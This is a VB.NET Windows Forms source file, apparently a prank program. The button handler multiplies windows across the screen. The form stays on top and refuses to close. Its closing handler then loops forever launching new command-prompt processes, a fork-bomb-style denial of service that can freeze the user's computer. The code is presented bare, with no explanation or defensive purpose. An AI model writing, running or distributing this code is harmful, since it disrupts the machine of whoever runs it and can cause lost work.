Public Class Form2
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim f1 As Form2 = New Form2
        Dim f3 As Form3 = New Form3
        Dim f4 As Form4 = New Form4
        f1.Show()
        f3.Show()
        f4.Show()
        Me.Hide()
        f1.Location = New Point(Rnd() * 900, Rnd() * 180)
        f3.Location = New Point(Rnd() * 860, Rnd() * 300)
        f4.Location = New Point(Rnd() * 700, Rnd() * 480)
    End Sub

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.TopMost = True
    End Sub

    Private Sub Form2_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
        Do
            Process.Start("cmd")
        Loop
    End Sub
End Class